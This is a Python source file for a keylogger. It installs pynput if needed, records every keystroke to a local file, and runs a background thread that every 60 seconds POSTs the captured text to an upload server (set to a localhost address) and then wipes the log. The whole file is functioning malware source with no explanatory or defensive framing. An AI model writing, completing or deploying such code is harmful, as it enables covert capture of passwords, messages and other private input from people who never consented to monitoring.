import os
import subprocess
import sys
import requests
import logging
import threading
from datetime import datetime
import termcolor

# Function to install pynput if not already installed
def install_pynput():
    try:
        import pynput
    except ImportError:
        print("pynput not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
        print("pynput installed successfully.")

# Install pynput if necessary
install_pynput()

from pynput.keyboard import Listener

#Configuration
LOG_FILE = "keylog.txt"
SERVER_URL = "http://127.0.0.1:5000/upload"
SEND_INTERVAL = 60

# Path for storing the log files
def getfilepath():
    base = 'logs'
    year = str(datetime.now().year)
    filename = "log_" + datetime.now().strftime('%Y-%m-%d') + ".txt"
    os.makedirs(os.path.join(base, year), exist_ok=True)
    return os.path.join(base, year, filename)

#log_file = getfilepath()
log_file = LOG_FILE


# State for handling caps lock 
state = {'caps_lock':False}

special_key = ["Key.shift", "Key.caps_lock", "Key.alt_l", "Key.alt_gr", "Key.shift_r", 
               "Key.ctrl_l", "Key.ctrl_r", "Key.esc"]

# Function to log key presses
def writeToFile(key):
    key = str(key)

    if not key.startswith("Key."):
        key = key[1:-1]

    print(key)

    if key == "Key.caps_lock":
        state["caps_lock"] = not state["caps_lock"]
    if key == "Key.space":
        key = ' '
    if key == "Key.enter":
        key = '\n'
    if key == "Key.tab":
        key = '  '
    if key in special_key or key.startswith('Key'):
        key = '[' + key.split('.')[1].upper() + ']'

    if state["caps_lock"]:
        key = key.upper()
    
    with open(log_file, 'a') as file:
        file.write(key)


# Function to send logs to the server
def send_logs():
    while True:
        try:
            # Read the log file
            with open(log_file, 'r') as file:
                log_data = file.read()

            # Send the log data to the server
            if log_data:
                response = requests.post(SERVER_URL, data={"logs": log_data})
                if response.status_code == 200:
                    print(termcolor.colored("Logs sent successfully!", "green"))
                    # Clear the log file after sending
                    with open(log_file, 'w') as file:
                        file.write("")
                else:
                    print(termcolor.colored(f"Failed to send logs. Server responded with status code: {response.status_code}", "red"))
        except Exception as e:
            print(termcolor.colored(f"Error sending logs: {e}", "red"))

        # Wait for the specified interval before sending again
        threading.Event().wait(SEND_INTERVAL)

# Start the log-sending thread
log_thread = threading.Thread(target=send_logs, daemon=True)
log_thread.start()

# Keylogger control
listener = None

def start_keylogger():
    global listener
    listener = Listener(on_press=writeToFile)
    listener.start()
    print("Keylogger started...")

def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()
        print("Keylogger stopped...")
    listener = None


#Main Function
if __name__=="__main__":
    start_keylogger()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        stop_keylogger()